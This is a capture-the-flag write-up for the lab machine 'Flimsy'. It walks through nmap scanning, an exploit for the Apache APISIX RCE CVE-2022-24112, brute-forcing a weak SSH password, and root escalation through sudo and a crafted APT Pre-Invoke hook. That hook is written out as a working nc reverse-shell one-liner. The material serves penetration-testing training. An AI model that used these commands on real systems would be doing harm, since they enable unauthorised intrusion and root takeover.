#box #HTTP-Headers-Versions #apisix #RCE #bruteforce #cron #apt-preInvoke

Flimsy is a box that manifests a vulnerability on a service called APISIX, an API Gateway from Apache. Once gained the RCE on the system we'll be logged as a low privilege user. Once authenticated we have two solutions:
* Using the `dictionary.txt` file found in `/usr/share/mysql` to try gain access as the user `ass` (funny one) (actually any list should grant us access in SSH with this user)
* Using an apt privilege escalation that leverage the `APT::Update::Pre-Invoke` function to execute a script as root (since a cronjob is running apt-get update as root)

## Nmap

Our Nmap scan returns us a set of values with the usual `--min-rate=10000` option. However, we try to run a normal scan with `nmap -p- $ip` to discover ports that were not discovered by using the fast option, obtaining, de facto a new port. Port 43500

```bash
# Nmap 7.95 scan initiated Mon May 26 16:40:40 2025 as: /usr/lib/nmap/nmap -p- -o nmap_allports 192.168.137.220
Nmap scan report for 192.168.137.220
Host is up (0.035s latency).
Not shown: 65333 filtered tcp ports (no-response), 197 filtered tcp ports (host-prohibited)
PORT      STATE  SERVICE
22/tcp    open   ssh
80/tcp    open   http
3306/tcp  open   mysql
8080/tcp  closed http-proxy
43500/tcp open   unknown

# Nmap done at Mon May 26 16:43:55 2025 -- 1 IP address (1 host up) scanned in 194.90 seconds
```

We perform a deeper scan on the open ports, obtaining the following:

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-27 17:20 UTC
Nmap scan report for 192.168.229.220
Host is up (0.041s latency).

PORT      STATE  SERVICE    VERSION
22/tcp    open   ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 62:36:1a:5c:d3:e3:7b:e1:70:f8:a3:b3:1c:4c:24:38 (RSA)
|   256 ee:25:fc:23:66:05:c0:c1:ec:47:c6:bb:00:c7:4f:53 (ECDSA)
|_  256 83:5c:51:ac:32:e5:3a:21:7c:f6:c2:cd:93:68:58:d8 (ED25519)
80/tcp    open   http       nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Upright
3306/tcp  open   mysql      MySQL (unauthorized)
8080/tcp  closed http-proxy
43500/tcp open   http       OpenResty web app server
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
|_http-server-header: APISIX/2.8
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.57 seconds
```

## HTTP

After discovering all the open http ports, we opt straight forward to port 43500, noticing a peculiar header in the Request Headers

![[attachments/flimsy-writeup-1.webp]]

## Foothold through APISIX RCE Vulnerability

By looking online we discover the existence of an APISIX RCE Vulnerability, precisely [CVE-2022-24112](https://github.com/M4xSec/Apache-APISIX-CVE-2022-24112). We download the script and execute it with the proper parameters while running a netcat listener aside

```bash
python3 apisix-exploit.py http://192.168.229.220:43500/ 192.168.45.249 1337
```

Obtaining a foothold as the user `franklin`.

---
Here the options to gain root separates, we'll first proceed with the one used, then with the one discovered online

## Privilege Escalation 1 
### Foothold 2

By traveling around the system, we discover the users which have a login session on that machine by using: `cat /etc/passwd | grep bash` obtaining the following 3:

```bash
root:x:0:0:root:/root:/bin/bash
ass:x:1000:1000:ass,,,:/home/ass:/bin/bash
franklin:x:65534:65534::/home/frank:/bin/bash
```

We also find a `dictionary.txt` file inside the folder `/usr/share/mysql` folder which seems a wordlist, so we download it and try to execute a Bruteforce Attack on the user `ass`.
After some time, the password was actually a really easy one, discovering the password `1234` (we could've achieved that with any wordlist actually).
The new foothold is `ass:1234`
### Privilege Escalation

Once inside SSH, we look at the new foothold's user capabilities and we discover that we can basically run any command
```bash
Matching Defaults entries for ass on flimsy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User ass may run the following commands on flimsy:
    (ALL : ALL) ALL
```
We then opt to easily authenticate as root within `sudo su`, reaching the peak and achieving `root` on the target machine.

---
## Privilege Escalation 2

As an alternative, we've discovered online that a vulnerability on the apt-update command when ran through a cronjob can be leverage to obtain a root shell. Precisely, the vulnerability is documented [here](https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/).
We opt to get a reverse shell by launching a shell command within the function `APT::Update::Pre-Invoke` that is invoked before executing the apt-update command. In this specific case, also the `Pre-Invoke` is executed as `root` because the user running `apt-get update` in the cronjob is root:

```bash
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root apt-get update # This command here testifies that each minute apt-get update is being ran as `root`
* * * * * root /root/run.sh
```

To properly perform the escalation, we'll have to create the shell file inside `/etc/apt/apt.conf.d/` which is the folder that `apt-get update` uses to run the update commands. In here, we'll put a file (usually it's better to name 00name in order to make sure it runs first) and we wait a minute for it to be executed:

```bash
echo 'APT::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.249 4444 >/tmp/f"}' > pwn
```

Once we'll have waited a minute, we'll catch the reverse shell on a setup netcat listener, in the case above, on port 4444.